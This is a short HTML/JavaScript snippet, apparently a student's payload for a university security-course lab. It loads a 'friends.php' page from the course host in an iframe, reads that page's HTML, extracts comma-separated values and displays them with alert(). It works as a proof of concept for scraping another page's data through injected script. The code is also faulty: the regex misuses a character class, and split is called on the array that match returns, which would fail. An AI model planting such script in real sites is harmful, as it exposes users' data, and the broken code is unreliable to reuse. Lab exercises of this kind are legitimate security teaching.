<iframe id="hiderr" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>
<script>
    var eff = document.getElementById("hiderr");
    eff.addEventListener("load",function(){
       var conter= eff.contentWindow.document.body.innerHTML.match('^[^<br]*');
       var cant= conter.split(',');
       alert(cant[0]);
       alert(cant[1]);
   });
</script>
